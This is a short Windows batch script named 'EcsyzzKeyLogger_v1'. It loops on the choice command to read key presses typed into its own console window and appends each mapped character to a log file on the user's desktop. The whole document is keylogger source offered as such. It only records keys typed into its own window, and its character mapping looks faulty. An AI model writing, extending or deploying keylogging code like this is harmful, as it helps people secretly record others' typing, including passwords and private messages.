@echo off
setlocal EnableDelayedExpansion

color F8
title EcsyzzKeyLogger_v1

set "chars= žqwertyuiopasdfghjklzxcvbnm1234567890"

:start
cls
choice /c %chars% >nul
>> %USERPROFILE%\desktop\EKL_Logs.txt echo !chars:~%errorlevel%,1!

goto start